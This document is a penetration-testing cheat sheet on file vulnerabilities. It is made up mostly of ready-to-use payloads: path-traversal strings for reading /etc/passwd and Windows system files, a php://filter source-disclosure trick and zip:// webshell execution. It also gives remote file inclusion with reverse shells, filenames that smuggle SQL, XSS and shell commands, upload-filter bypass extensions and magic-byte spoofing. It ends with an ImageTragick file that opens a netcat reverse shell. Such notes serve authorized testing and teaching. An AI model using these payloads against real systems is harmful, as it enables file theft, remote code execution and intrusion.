# File Vulnerabilities

## LFI

local file inclusion happens when it is possible to access files stored on the target's system by passing a relative path to a parameter of a request. The number of "up one level instructions" is irrelevant because once we reach the root level, the additional "go up" instructions will be ignored.

See [LFI List](lfi-list.md) for a list of possible target files for tests

### Payloads

```
#Linux
../../../../../../../../../../../../etc/passwd
#Windows
..\..\..\..\..\..\..\..\..\..\..\..\Windows\system.ini
..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
```

### Importing with file modifiers

Disclose PHP file source code

<pre><code><strong>&#x3C;url>?&#x3C;arg>=php://filter/convert.base64-encode/resource=&#x3C;php file>.php
</strong></code></pre>

Execute webshell from a ZIP file. The webshell extension ca be omitted

```
<url>?<arg>=zip://<path to zip file>%23<webshell>?<args>
```

## RFI

Remote file inclusion happens when an attacker is able to make a web server include and execute files hosted on a different server controlled by the attacker. For instance by making a parameter point to an url of a file such as a reverse shell written in php it is possible to make the server follow the url and execute the shell

See [PHP shells](php-shells.md) for shells to be used in an attack. Keep in mind that these files MUST be stored as .txt files instead of their executable format (.php, .jsp, .asp). If you don't do this the malicious code will be executed on your local server instead of the remote one

#### Payloads

```
www.google.com    #expect to see html code as result
<your url>:<port> #start a listener on the port and see if you receive an HTTP request
```

## File upload functionality

### Filename payloads

```
../../../tmp/evil.png                 #test for LFI
sleep(10)-- -.jpg                     #test for SQLi
<svg onload=alert(document.domain)>   #test for stored XSS
; sleep 10;                           #test for RCE
```

### Evade file restrictions

Changing the content type header when trying to upload reverse shells can bypass simple files detection systems.

These strings are effective in evading file upload checks only if the server does not check the actual file signature but checks only the extension.

```php
file.png.php
file.png.Php5
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.php....
file.pHp5....
file.png.php
file.png.pHp5
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
flile.phpJunk123png
file.png.jpg.php
file.php%00.png%00.jpg
```

### Magic bytes

To bypass file controls based on MIME type and file signature insert the following bytes sequences at the beginning of the file to change its type and edit file extension accordingly. Once the file is stored on the server you will have to find a way to edit it back in order to restore its origina behavior when opened

```php
python -c "print '<signature>'" > <file>
#hex signature example: \x4D\x5A
```

| File type                  | Mnemonic       | Signature                               |
| -------------------------- | -------------- | --------------------------------------- |
| DOS executable             | "MZ"           | 0x4D 0x5A                               |
| PE32 executable            | "MZ"...."PE.." | 0x4D 0x5A ... 0x50 0x45 0x00 0x00       |
| Mach-O Executable (32 bit) | "FEEDFACE"     | 0xFE 0xED 0xFA 0xCE                     |
| Mach-O Executable (64 bit) | "FEEDFACF"     | 0xFE 0xED 0xFA 0xCF                     |
| ELF Executable             | ".ELF"         | 0x7F 0x45 0x4C 0x46                     |
| Zip Archive                | "PK.."         | 0x50 0x4B 0x03 0x04                     |
| Rar Archive                | "Rar!...."     | 0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00 |
| Ogg Container              | "OggS"         | 0x4F 0x67 0x67 0x53                     |
| Matroska/EBML Container    | N/A            | 0x45 0x1A 0xA3 0xDF                     |
| PNG Image                  | ".PNG...."     | 0x89 0x50 0x4E 0x47 0x0D 0x0A 0x1A 0x0A |
| BMP Image                  | "BM"           | 0x42 0x4D                               |
| GIF Image                  | "GIF87a"       | 0x47 0x49 0x46 0x38 0x37 0x61           |
| GIF Image                  | "GIF89a"       | 0x47 0x49 0x46 0x38 0x39 0x61           |

## ImageTrick vulnerability

Save this code snippet in a text file and upload it to receive a reverse shell

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|nc -e /bin/sh <IP> "<PORT>)'
pop graphic-context
```
